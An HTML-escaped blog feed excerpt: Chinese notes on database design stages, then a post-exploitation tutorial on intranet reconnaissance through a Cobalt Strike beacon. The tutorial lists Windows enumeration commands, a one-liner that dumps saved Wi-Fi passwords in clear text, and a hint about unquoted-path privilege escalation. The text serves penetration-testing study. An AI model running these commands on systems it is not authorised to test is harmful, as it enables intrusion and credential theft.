&lt;h2 id=&#34;数据库设计概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计概述&#34;&gt;#&lt;/a&gt; 数据库设计概述&lt;/h2&gt;
&lt;p&gt;数据库设计是指对于一个给定的应用环境，设计优化的 &lt;code&gt;数据库逻辑模式和物理结构&lt;/code&gt; ，并据此建立数据库及其应用系统，使之能够有效的存储和管理数据，满足各种用户的应用需求，包括信息管理要求和数据操作要求&lt;/p&gt;
&lt;p&gt;数据库设计的目的是为用户和各种应用系统提供一个信息基础设施和高效率的运行环境&lt;/p&gt;
&lt;h3 id=&#34;数据库设计的特点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计的特点&#34;&gt;#&lt;/a&gt; 数据库设计的特点&lt;/h3&gt;
&lt;p&gt;数据库设计的一个主要特点 ----- &lt;code&gt;三分技术，七分管理，十二分基础数据&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;管理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据库建设项目管理&lt;/li&gt;
&lt;li&gt;企业的业务管理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;基础数据&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;收集&lt;/li&gt;
&lt;li&gt;更新新的数据&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第二个特点 ----- &lt;code&gt;结构（数据）设计和行为（处理）设计相结合&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;数据库设计的方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计的方法&#34;&gt;#&lt;/a&gt; 数据库设计的方法&lt;/h3&gt;
&lt;p&gt;手工与经验相结合方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;设计质量与设计人员的经验和水平有直接关系&lt;/li&gt;
&lt;li&gt;数据库运行一段时间后常常不同程度地发现各种问题提高的维护代价&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;规范设计法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;基本思想：过程迭代和逐步求精&lt;/li&gt;
&lt;li&gt;新奥尔良方法
&lt;ul&gt;
&lt;li&gt;将数据库设计分为若干阶段和步骤&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;基于 E-R 模型的数据库设计方法
&lt;ul&gt;
&lt;li&gt;概念设计阶段广泛采用&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;3NF 的设计方法
&lt;ul&gt;
&lt;li&gt;逻辑阶段可采用的有效方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ODL 方法
&lt;ul&gt;
&lt;li&gt;面向对象的设计方法&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据库设计的基本步骤&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计的基本步骤&#34;&gt;#&lt;/a&gt; 数据库设计的基本步骤&lt;/h3&gt;
&lt;p&gt;主要分为六个阶段&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需求分析
&lt;ul&gt;
&lt;li&gt;需求收集和分析&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;概念结构设计
&lt;ul&gt;
&lt;li&gt;设计 E-R 模型&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;逻辑结构设计
&lt;ul&gt;
&lt;li&gt;设计逻辑结构数据模型优化&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;物理结构设计
&lt;ul&gt;
&lt;li&gt;设计物理结构评价设计，性能预测&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据库实施
&lt;ul&gt;
&lt;li&gt;物理实现尝试运行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据库运行和维护
&lt;ul&gt;
&lt;li&gt;使用、维护数据库&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105170541371.png&#34; alt=&#34;image-20230105170541371&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;数据库设计过程中的各级模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库设计过程中的各级模式&#34;&gt;#&lt;/a&gt; 数据库设计过程中的各级模式&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105171313745.png&#34; alt=&#34;image-20230105171313745&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;需求分析&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#需求分析&#34;&gt;#&lt;/a&gt; 需求分析&lt;/h2&gt;
&lt;h3 id=&#34;需求分析的任务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#需求分析的任务&#34;&gt;#&lt;/a&gt; 需求分析的任务&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;详细调查现实世界要处理的对象 (组织、部门企等）&lt;/li&gt;
&lt;li&gt;充分了解原系统 (手工系统或计算机系统）&lt;/li&gt;
&lt;li&gt;明确用户的各种需求&lt;/li&gt;
&lt;li&gt;确定新系统的功能&lt;/li&gt;
&lt;li&gt;充分考虑今后可能的扩充和改变&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;需求分析的重点&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#需求分析的重点&#34;&gt;#&lt;/a&gt; 需求分析的重点&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;调查的重点是 “数据” 和 “处理”，获得用户对数据库要求
&lt;ul&gt;
&lt;li&gt;信息要求&lt;/li&gt;
&lt;li&gt;处理要求&lt;/li&gt;
&lt;li&gt;安全性与完整性要求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;确定用户最终需求
&lt;ul&gt;
&lt;li&gt;用户缺少计算机知识&lt;/li&gt;
&lt;li&gt;设计人员缺少用户的专业知识&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;解决办法
&lt;ul&gt;
&lt;li&gt;设计人员必须不断深入地与用户进行交流&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;需求分析的方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#需求分析的方法&#34;&gt;#&lt;/a&gt; 需求分析的方法&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;调查了解清楚用户的实际需求并进行初步分析
&lt;ol&gt;
&lt;li&gt;调查组织机构情况&lt;/li&gt;
&lt;li&gt;&lt;code&gt;调查各部门的业务活动情况&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;协助用户明确对新系统的要求&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;确定新系统的边界&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;与用户达成共识&lt;/li&gt;
&lt;li&gt;进一步分析与表达这些需求&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常用方法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;跟班作业（耗时但是有效）&lt;/li&gt;
&lt;li&gt;开调查会（常用）&lt;/li&gt;
&lt;li&gt;问卷调查（简单有效）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230105172604633.png&#34; alt=&#34;image-20230105172604633&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;数据字典&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据字典&#34;&gt;#&lt;/a&gt; 数据字典&lt;/h3&gt;
&lt;p&gt;用途： &lt;code&gt;是系统中各类数据描述的集合，进行详细的数据收集和数据分析所获得的主要结果&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;字典的内容&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据项
&lt;ul&gt;
&lt;li&gt;不可再分的数据单位&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据结构
&lt;ul&gt;
&lt;li&gt;反应了数据之间的组合关系&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据流
&lt;ul&gt;
&lt;li&gt;数据结构再系统内传输的路径&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据存储
&lt;ul&gt;
&lt;li&gt;数据结构停留和保存的地方，也是数据流的来源和去向之一&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;处理过程
&lt;ul&gt;
&lt;li&gt;描述处理过程的说明性信息&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;数据字典是关于数据库中数据的描述，是元数据，而不是数据本身&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;概念结构设计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概念结构设计&#34;&gt;#&lt;/a&gt; 概念结构设计&lt;/h2&gt;
&lt;h3 id=&#34;概念模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#概念模型&#34;&gt;#&lt;/a&gt; 概念模型&lt;/h3&gt;
&lt;p&gt;概念模型的主要特点是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;能真实，充分的反映现实世界&lt;/li&gt;
&lt;li&gt;易于理解&lt;/li&gt;
&lt;li&gt;易于更改&lt;/li&gt;
&lt;li&gt;易于向关系网状，层次等数据类型的转换&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;属性和实体的划分准则&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;属性是不能再具有需要描述的性质&lt;/li&gt;
&lt;li&gt;属性不能与其他实体具有联系&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;逻辑结构设计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#逻辑结构设计&#34;&gt;#&lt;/a&gt; 逻辑结构设计&lt;/h2&gt;
&lt;p&gt;把上一个阶段设计好的 E-R 模型转换成选用 DBMS 产品支持的数据模型相符合的逻辑结构&lt;/p&gt;
&lt;h3 id=&#34;e-r图向关系模型的转换&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#e-r图向关系模型的转换&#34;&gt;#&lt;/a&gt; E-R 图向关系模型的转换&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;E-R 图向关系模型的转换要解决的问题
&lt;ul&gt;
&lt;li&gt;如何将实体型和实体间的联系转换为关系模式&lt;/li&gt;
&lt;li&gt;如何确定这些关系模式的属性和码&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;转换内容
&lt;ul&gt;
&lt;li&gt;将 E-R 图转换为关系模型：将实体、实体的属性和实体之间的联系转换为关系模式&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;转换原则
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;一个实体型转换为一个关系模型&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;联系分为多种情况进行转换&lt;/code&gt;
&lt;ol&gt;
&lt;li&gt;一个 1:1 联系可以转换为一个独立的关系模式，也可以与任意一端对应的关系模式合并。&lt;/li&gt;
&lt;li&gt;一个 l:n 联系可以转换为一个独立的关系模式，也可以与 n 端对应的关系模式合并。&lt;/li&gt;
&lt;li&gt;一个 m:n 联系转换为一个关系模式，&lt;/li&gt;
&lt;li&gt;三个或三个以上实体间的一个多元联系可以转换为一个关系模式。&lt;/li&gt;
&lt;li&gt;具有相同码的关系模式可合并。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据模型的优化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据模型的优化&#34;&gt;#&lt;/a&gt; 数据模型的优化&lt;/h3&gt;
&lt;p&gt;得到初步数据模型后，还应该适当地修改、调整数据模型的结构，以进一步提高数据库应用系统的性能，这就是数据模型的优化&lt;/p&gt;
&lt;p&gt;关系数据模型的优化通常以规范化理论为指导&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;确定数据依赖&lt;/li&gt;
&lt;li&gt;极小化处理&lt;/li&gt;
&lt;li&gt;确定所属范式&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;通过分解&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;水平分解&lt;/p&gt;
&lt;p&gt;把基本关系的元组分为若干子集合，定义每个子集合为一个子关系，以提高系统利用率&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;垂直分解&lt;/p&gt;
&lt;p&gt;把关系模式 R 的属性分解为若干子集合，形成若干子关系模式&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;设计用户子模式&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#设计用户子模式&#34;&gt;#&lt;/a&gt; 设计用户子模式&lt;/h3&gt;
&lt;p&gt;注重的问题&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使更符合用户的别名&lt;/li&gt;
&lt;li&gt;针对不同级别的用户定义不同的 View ，以满足系统对安全性的要求。&lt;/li&gt;
&lt;li&gt;简化用户对系统的使用&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;数据库的物理设计&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库的物理设计&#34;&gt;#&lt;/a&gt; 数据库的物理设计&lt;/h2&gt;
&lt;p&gt;数据库在物理设备上的 &lt;code&gt;存储结构与存取方法&lt;/code&gt; 称为数据库的物理结构，它依赖于选定的数据库管理系统为一个给定的逻辑数据模型选取一个最适合应用环境的物理结构的过程，就是数据库的物理设计&lt;/p&gt;
&lt;h3 id=&#34;物理数据库设计的内容和方法&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#物理数据库设计的内容和方法&#34;&gt;#&lt;/a&gt; 物理数据库设计的内容和方法&lt;/h3&gt;
&lt;p&gt;设计物理数据库结构的准备工作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;对要运行的事务进行详细分析，获得选择物理数据库设计所需参数&lt;/li&gt;
&lt;li&gt;充分了解所用 RDBMS 的内部特征，特别是系统提供的存取方法和存储结构&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;选择物理数据库设计所需参数&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;数据库询事务
&lt;ol&gt;
&lt;li&gt;查询的关系&lt;/li&gt;
&lt;li&gt;查条件所涉及的属性&lt;/li&gt;
&lt;li&gt;连接条件所涉及的属性&lt;/li&gt;
&lt;li&gt;查询的投影属性&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;数据更新事务
&lt;ol&gt;
&lt;li&gt;被更新的关系&lt;/li&gt;
&lt;li&gt;每个关系上的更新操作条所及的属性&lt;/li&gt;
&lt;li&gt;修改操作要改变的属性值&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;每个事务在各关系上运行的频率和性能要求&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;物理设计的内容&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为关系模式选择 &lt;code&gt;存取方法&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;设计关系，索引等数据库文件的物理存储结构&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;关系数据库存取方法选择&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关系数据库存取方法选择&#34;&gt;#&lt;/a&gt; 关系数据库存取方法选择&lt;/h3&gt;
&lt;p&gt;数据库系统是多用户共享的系统，对同一个关系要建立 &lt;code&gt;多条存取路径&lt;/code&gt; 才能满足多用户的多种应用要求&lt;br /&gt;
物理设计的任务之一就是要确定选择哪些存取方法，即 &lt;code&gt;建立哪些存取路径&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;确定数据库的存储结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#确定数据库的存储结构&#34;&gt;#&lt;/a&gt; 确定数据库的存储结构&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;确定数据的存放位置和存储结构
&lt;ul&gt;
&lt;li&gt;因素
&lt;ul&gt;
&lt;li&gt;存取时间&lt;/li&gt;
&lt;li&gt;存取空间利用率&lt;/li&gt;
&lt;li&gt;维护代价&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;确定系统配置
&lt;ul&gt;
&lt;li&gt;原则
&lt;ul&gt;
&lt;li&gt;易变部分与稳定部分分开存放&lt;/li&gt;
&lt;li&gt;存取频率较高部分与存取频率较低部分，分开存放&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;数据库实施和维护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库实施和维护&#34;&gt;#&lt;/a&gt; 数据库实施和维护&lt;/h2&gt;
&lt;h3 id=&#34;数据载入和应用程序的调试&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据载入和应用程序的调试&#34;&gt;#&lt;/a&gt; 数据载入和应用程序的调试&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;数据的载入
&lt;ul&gt;
&lt;li&gt;组织数据入库是数据库实施阶段最主要的工作&lt;/li&gt;
&lt;li&gt;载入方法有人工和计算机辅助两种&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;应用程序的编码和调试
&lt;ul&gt;
&lt;li&gt;数据库应用程序的设计应该与数据设计并行进行&lt;/li&gt;
&lt;li&gt;在组织数据入库的同时还要调试应用程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;数据库的试运行&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库的试运行&#34;&gt;#&lt;/a&gt; 数据库的试运行&lt;/h3&gt;
&lt;p&gt;在原有系统的数据有一小部分已输入数据库后，就可以开始对数据库系统进行联合调试，称为数据库的试运行&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;功能测试
&lt;ul&gt;
&lt;li&gt;实际运行数据库应用程序，执行对数据库的各种操作，测试应用程序的功能是否满足设计要求&lt;/li&gt;
&lt;li&gt;如果不满足，对应用程序部分则要修改、调整，直到达到计要求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;性能测试
&lt;ul&gt;
&lt;li&gt;测量系统的性能指标，分析是否达到设计目标&lt;/li&gt;
&lt;li&gt;如果测试的结果与设计目标不符，则要返回物理设计阶段，重新调整物理结构，修改系统参数，某些情况下甚至要返回逻辑设计阶段，修改逻辑结构&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;数据库的转储和恢复
&lt;ul&gt;
&lt;li&gt;在数据库试运行阶段，系统还不稳定，硬、软故障随时都可能发生&lt;/li&gt;
&lt;li&gt;系统的操作人员对新系统还不熟悉，误操作也不可避免&lt;/li&gt;
&lt;li&gt;因此必须做好数据库的转储和恢复工作，尽量减少对数据库的破坏。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;数据库的运行和维护&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库的运行和维护&#34;&gt;#&lt;/a&gt; 数据库的运行和维护&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;数据库试运行合格后，数据库即可投入正式运行。&lt;/li&gt;
&lt;li&gt;数据库投入运行标志着开发任务的基本完成和维护工作的开始&lt;/li&gt;
&lt;li&gt;对数据库设计进行评价、调整、修改等维护工作是个长期的任务，也是设计工作的继续和提高&lt;/li&gt;
&lt;/ol&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://blog.xcu.icu/2022/12/23/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</guid>
            <title>内网信息收集</title>
            <link>https://blog.xcu.icu/2022/12/23/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</link>
            <category term="内网" scheme="https://blog.xcu.icu/categories/%E5%86%85%E7%BD%91/" />
            <category term="域环境" scheme="https://blog.xcu.icu/tags/%E5%9F%9F%E7%8E%AF%E5%A2%83/" />
            <pubDate>Fri, 23 Dec 2022 00:00:00 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h3&gt;
&lt;p&gt;本篇对内网信息收集做一个补充，这里的命令是运行在 cs 上线的前提下，在命令前要加上 shell&lt;/p&gt;
&lt;h3 id=&#34;控制机信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#控制机信息收集&#34;&gt;#&lt;/a&gt; 控制机信息收集&lt;/h3&gt;
&lt;h4 id=&#34;网段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网段&#34;&gt;#&lt;/a&gt; 网段&lt;/h4&gt;
&lt;p&gt;这个很简单，使用 ipconfig 就可以知道 ip 也就可以知道网段，通过网段可以去扫描其他存活主机&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194008596.png&#34; alt=&#34;image-20221223194008596&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;进程信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#进程信息&#34;&gt;#&lt;/a&gt; 进程信息&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;tasklist
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194159288.png&#34; alt=&#34;image-20221223194159288&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;开机自启&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开机自启&#34;&gt;#&lt;/a&gt; 开机自启&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;wmic startup get command,caption
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194454199.png&#34; alt=&#34;image-20221223194454199&#34; /&gt;&lt;/p&gt;
&lt;p&gt;开机自启如果它后面没有引号可以利用它来提权，提到高权限就会很危险，这里仅做信息收集不在展开&lt;/p&gt;
&lt;h4 id=&#34;开机时间&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开机时间&#34;&gt;#&lt;/a&gt; 开机时间&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;net statistics workstation
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223194903747.png&#34; alt=&#34;image-20221223194903747&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看本地用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看本地用户&#34;&gt;#&lt;/a&gt; 查看本地用户&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;net user
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195008118.png&#34; alt=&#34;image-20221223195008118&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;会话连接情况&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#会话连接情况&#34;&gt;#&lt;/a&gt; 会话连接情况&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;netstat -ano
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195227859.png&#34; alt=&#34;image-20221223195227859&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看补丁信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看补丁信息&#34;&gt;#&lt;/a&gt; 查看补丁信息&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;通过这个可以判断一些漏洞有没有被修补&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195521086.png&#34; alt=&#34;image-20221223195521086&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看默认共享&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看默认共享&#34;&gt;#&lt;/a&gt; 查看默认共享&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;net share
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223195825193.png&#34; alt=&#34;image-20221223195825193&#34; /&gt;&lt;/p&gt;
&lt;p&gt;共享是有很多漏洞点控制的&lt;/p&gt;
&lt;h4 id=&#34;路由信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#路由信息&#34;&gt;#&lt;/a&gt; 路由信息&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;route print
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200054631.png&#34; alt=&#34;image-20221223200054631&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;防火墙信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防火墙信息&#34;&gt;#&lt;/a&gt; 防火墙信息&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;net firewall show config
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200348100.png&#34; alt=&#34;image-20221223200348100&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;wifi连接记录&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#wifi连接记录&#34;&gt;#&lt;/a&gt; wifi 连接记录&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;for /f &amp;quot;skip=9 tokens=1,2 delims=:&amp;quot; %i in (&#39;netsh wlan show profiles&#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里因为我搭建的域内服务器没有信息这里放的是我本地的截图&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223200840295.png&#34; alt=&#34;image-20221223200840295&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;arp信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#arp信息&#34;&gt;#&lt;/a&gt; ARP 信息&lt;/h4&gt;
&lt;p&gt;看还有哪些网段&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;arp -a
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201027450.png&#34; alt=&#34;image-20221223201027450&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看最近打开的文档&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看最近打开的文档&#34;&gt;#&lt;/a&gt; 查看最近打开的文档&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;dir %APPDATA%\Microsoft\Windows\Recent
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201310126.png&#34; alt=&#34;image-20221223201310126&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看本地用户组&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看本地用户组&#34;&gt;#&lt;/a&gt; 查看本地用户组&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;net localgroup
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201733749.png&#34; alt=&#34;image-20221223201733749&#34; /&gt;&lt;/p&gt;
&lt;h4 id=&#34;查看组中成员&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看组中成员&#34;&gt;#&lt;/a&gt; 查看组中成员&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;net localgroup administrators
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221223201901678.png&#34; alt=&#34;image-20221223201901678&#34; /&gt;&lt;/p&gt;
&lt;p&gt;当电脑加入一个域后，在本地管理员组中有两个默认的管理员，一个是 administrator，一个是域里面的 domain adminis 组。&lt;/p&gt;
&lt;h3 id=&#34;域内信息收集&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#域内信息收集&#34;&gt;#&lt;/a&gt; 域内信息收集&lt;/h3&gt;
